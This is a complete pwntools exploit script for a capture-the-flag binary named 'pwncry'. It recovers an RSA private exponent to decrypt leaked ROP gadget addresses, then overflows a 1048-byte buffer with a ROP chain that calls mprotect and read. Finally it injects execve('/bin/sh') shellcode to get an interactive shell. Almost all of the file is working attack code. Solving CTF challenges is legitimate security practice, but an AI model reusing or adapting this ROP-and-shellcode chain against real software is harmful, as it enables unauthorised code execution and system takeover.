#!/usr/bin/python3

from pwn import *

exe = ELF('pwncry', checksec=False)

context.binary = exe

def check_addr(addr):
	# scanf() don't like bytes 0x07 -> 0x0d and 0x20 (space)
	for b in p64(addr):
		if (0x7 <= b and b <= 0xd) or b==0x20:
			return 0
	return 1

def GDB():
	if not args.REMOTE:
		gdb.attach(p, gdbscript='''
		b*main+366
		
		c
		''')
		input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
s = lambda data: p.send(data)

while True:
	if args.REMOTE:
		p = remote('127.0.0.1', 10003)
	else:
		p = process(exe.path)

	#########################################
	### Stage 1: Get addresses of gadgets ###
	#########################################
	# Get n, e and use RsaCtfTool to get d
	# Get RsaCtfTool: https://github.com/RsaCtfTool/RsaCtfTool
	p.recvuntil(b'(n, e) = (')
	n, e = p.recvuntil(b')\n', drop=True).split(b', ')
	n = int(n)
	e = int(e)
	info("n: " + str(n))
	info("e: " + str(e))

	sla(b'> ', b'2')
	p.recvuntil(b'Cred 1: ')
	mov_al_0xa = int(p.recvline()[:-1])
	p.recvuntil(b'Cred 2: ')
	pop_rdi = int(p.recvline()[:-1])
	p.recvuntil(b'Cred 3: ')
	pop_rsi = int(p.recvline()[:-1])
	p.recvuntil(b'Cred 4: ')
	pop_rdx = int(p.recvline()[:-1])
	p.recvuntil(b'Cred 5: ')
	syscall = int(p.recvline()[:-1])

	# Get d
	q = process(f'RsaCtfTool -n {n} -e {e} --uncipher {mov_al_0xa} --dump'.split())
	q.recvuntil(b'Results')
	q.recvuntil(b'd: ')
	d = int(q.recvline()[:-1].replace(b'\x1b[0m', b''))
	q.close()
	info("d: " + str(d))

	# Recover addresses
	mov_al_0xa = pow(mov_al_0xa, d, n)
	pop_rdi = pow(pop_rdi, d, n)
	pop_rsi = pow(pop_rsi, d, n)
	pop_rdx = pow(pop_rdx, d, n)
	syscall = pow(syscall, d, n)
	info("mov al, 0xa: " + hex(mov_al_0xa))
	info("pop rdi: " + hex(pop_rdi))
	info("pop rsi: " + hex(pop_rsi))
	info("pop rdx: " + hex(pop_rdx))
	info("syscall: " + hex(syscall))

	# Check if addresses can be used later
	if not check_addr(mov_al_0xa):
		log.critical("mov al, 0xa has prohibit byte")
		p.close()
		continue
	if not check_addr(pop_rdi):
		log.critical("pop_rdi has prohibit byte")
		p.close()
		continue
	if not check_addr(pop_rsi):
		log.critical("pop_rsi has prohibit byte")
		p.close()
		continue
	if not check_addr(pop_rdx):
		log.critical("pop_rdx has prohibit byte")
		p.close()
		continue
	if not check_addr(syscall):
		log.critical("syscall has prohibit byte")
		p.close()
		continue
	break

###########################################################
### Stage 2: Execute mprotect to set rwx for an address ###
###########################################################
# GDB()
payload = flat(
	b'A'*1048,

	# mprotect(<buffer>, 0x1000, 7)
	mov_al_0xa,
	pop_rdi, (pop_rdi >> 12) << 12,
	pop_rsi, 0x1000,
	pop_rdx, 7,
	syscall,

	# read(0, <buffer>, 0x100)
	pop_rdi, 0,
	pop_rsi, (pop_rdi >> 12) << 12,
	pop_rdx, 0x100,
	syscall,

	# Jump and execute shellcode
	(pop_rdi >> 12) << 12,
)
sla(b'> ', b'1')
sla(b'> ', payload)

# Send shellcode
sc = asm(
	'''
	movabs rax, 29400045130965551
	push rax
	mov rax, 0x3b
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	syscall
	''', arch='amd64')
s(sc)

p.interactive()
